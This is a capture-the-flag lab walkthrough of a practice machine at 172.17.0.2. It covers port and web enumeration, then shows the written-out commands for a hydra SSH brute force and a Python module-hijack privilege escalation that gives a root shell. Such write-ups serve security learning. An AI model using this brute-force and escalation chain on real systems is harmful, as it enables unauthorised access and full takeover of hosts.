# IP
172.17.0.2
# Reconnaissance
## Host discovery
``` bash
ping -c 2 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.117 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.062 ms

--- 172.17.0.2 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1024ms
rtt min/avg/max/mdev = 0.062/0.089/0.117/0.027 ms
```
## Ports scanning (TCP)
``` bash
sudo nmap -p- --open -sS --min-rate 5000 -n -Pn 172.17.0.2
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-06 16:53 -0300
Nmap scan report for 172.17.0.2
Host is up (0.0000020s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: CE:4D:BA:C4:0A:DA (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.44 seconds
```
``` bash
sudo nmap -p22,80 -sS -sCV -T4 --min-rate 5000 -n -Pn 172.17.0.2
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-06 16:54 -0300
Nmap scan report for 172.17.0.2
Host is up (0.000026s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 f9:f6:fc:f7:f8:4d:d4:74:51:4c:88:23:54:a0:b3:af (ECDSA)
|_  256 fd:5b:01:b6:d2:18:ae:a3:6f:26:b2:3c:00:e5:12:c1 (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.58 (Ubuntu)
MAC Address: CE:4D:BA:C4:0A:DA (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.29 seconds
```
# Web enumeration
## Dir fuzzing
``` bash
gobuster dir -u http://172.17.0.2 -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt -x php,html,txt
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              html,txt,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
index.php            (Status: 200) [Size: 26]
index.html           (Status: 200) [Size: 10671]
javascript           (Status: 301) [Size: 313] [--> http://172.17.0.2/javascript/]
server-status        (Status: 403) [Size: 275]
Progress: 830564 / 830564 (100.00%)
===============================================================
Finished
===============================================================
```
``` bash
curl http://172.17.0.2/index.php
<h1>JIFGHDS87GYDFIGD</h1>
```
# SSH
Let's brute force assuming JIFGHDS87GYDFIGD is a password
``` bash
hydra -L /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -p JIFGHDS87GYDFIGD ssh://172.17.0.2 -vV -F -t 16
[22][ssh] host: 172.17.0.2   login: carlos   password: JIFGHDS87GYDFIGD
```
``` bash
ssh carlos@172.17.0.2
```
# Privilege escalation
``` bash
sudo -l
(ALL) NOPASSWD: /usr/bin/python3 /opt/script.py
```
``` bash
cat /opt/script.py
import shutil

def copiar_archivo(origen, destino):
    shutil.copy(origen, destino)
    print(f'Archivo copiado de {origen} a {destino}')

if __name__ == '__main__':
    origen = '/opt/script.py'
    destino = '/tmp/script_backup.py'
    copiar_archivo(origen, destino)
```
``` bash
ls -la /opt
total 12
drwxr-xr-x 1 carlos root 4096 May  7  2024 .
drwxr-xr-x 1 root   root 4096 Oct  6 19:53 ..
-r-xr--r-- 1 carlos root  272 May  7  2024 script.py
```
carlos can write in the /opt directory
``` bash
echo 'import os; os.execl("/bin/sh", "sh")' > /opt/shutil.py
chmod +x /opt/shutil.py
sudo -u root /usr/bin/python3 /opt/script.py
whoami
root
```
